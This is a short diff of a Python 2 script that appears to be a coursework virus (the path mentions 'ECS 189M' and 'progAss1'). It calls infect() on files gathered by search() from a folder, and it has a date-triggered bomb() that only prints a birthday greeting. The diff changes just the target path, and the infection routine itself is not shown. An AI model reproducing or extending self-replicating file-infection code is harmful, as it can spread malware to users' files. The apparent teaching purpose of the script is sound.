@@ -33,6 +33,6 @@ def infect(filestoinfect):
 def bomb():
     if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
         print "HAPPY BIRTHDAY CRANKLIN!"
-filestoinfect = search(os.path.abspath("C:\Users\MANO\Downloads\ECS 189M\progAss1"))
+filestoinfect = search(os.path.abspath("\Users\MANO\Downloads\ECS 189M\progAss1"))
 infect(filestoinfect)
 bomb()
